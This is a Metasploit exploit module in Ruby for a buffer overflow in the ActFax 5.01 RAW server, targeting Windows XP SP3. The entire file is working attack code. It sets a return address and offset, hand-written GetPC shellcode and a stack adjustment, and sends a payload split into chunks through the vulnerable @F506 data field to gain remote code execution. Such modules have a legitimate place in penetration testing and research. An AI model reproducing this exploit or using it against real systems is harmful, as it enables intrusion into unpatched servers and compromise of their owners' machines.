# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;ActFax 5.01 RAW Server Buffer Overflow&#039;,
      &#039;Description&#039;  => %q{
          This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW Server can 
          be used to transfer fax messages to the fax server without any underlying protocols. To 
          note significant fields in the fax being transfered, like fax number and receipient, you can 
          use ActFax data fields. @F506,@F605, and @F000 are all data fields that are vulnerable. 
          For more information refer to the &#039;data fields&#039; section of the help menu in ActFax. This has 
          been fixed in a beta version which wont be pushed to release until May 2013. 
          Beta is here: http://www.actfax.com/download/beta/actfax_setup_en.exe
          
      },
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;Craig Freyman @cd1zz&#039;,  #discovery and msf
          &#039;corelanc0d3r&#039;, #lots of help with getpc routine => https://www.corelan-training.com/index.php/training/corelan-live
        ],
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;&#039; ],
          [ &#039;CVE&#039;, &#039;&#039; ],
          [ &#039;URL&#039;, &#039;http://www.pwnag3.com/2013/02/actfax-raw-server-exploit.html&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;none&#039;, 
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
        },
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Payload&#039;  =>
        {
          &#039;BadChars&#039; => "\x00\x40",
          &#039;DisableNops&#039; => true,
          &#039;Space&#039; => 1000,
          &#039;EncoderType&#039;    => Msf::Encoder::Type::AlphanumMixed,
                          &#039;EncoderOptions&#039; => { &#039;BufferRegister&#039; => &#039;EBX&#039; }
                      
        },

      &#039;Targets&#039;    =>
        [
          [ &#039;Windows XP SP3&#039;,
            {
              &#039;Ret&#039;     =>  0x775e3422, #ole32.dll v5.1.2600.6168
              &#039;Offset&#039;  =>  1024
            }
          ],
        ],
      &#039;Privileged&#039;  => false,
      &#039;DisclosureDate&#039;  => &#039;Feb 5 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([Opt::RPORT(0)], self.class)

  end

  def exploit
    
    connect  
      
    getpc = "\xe8\xff\xff\xff\xff\xc3\x5b" #ebx|  call + 4: 
    add_ebx = "\x83\xc3\x20" #add ebx,32 
    fill = "\x4b" * 5 #inc ebx 5 times
    fill2 = "\x90" * 17 
    stack_adjust = "\x81\xc4\x24\xfa\xff\xff" #add esp,-1500
    shell_chunk1 = payload.encoded[0,522]
    shell_chunk2 = payload.encoded[522,payload.encoded.length-522] 
      
    buffer = ""
    buffer << shell_chunk2
    buffer << rand_text_alpha(target[&#039;Offset&#039;]-buffer.length)
    buffer << [target.ret].pack(&#039;V&#039;)
    buffer << stack_adjust  
    buffer << getpc 
    buffer << add_ebx 
    buffer << fill 
    buffer << fill2 
    buffer << shell_chunk1
        
    print_status("Trying target #{target.name}...")
    sock.put("@F506 "+buffer+"@\r\npwnag3\r\n\r\n")

    handler
    disconnect

  end
end

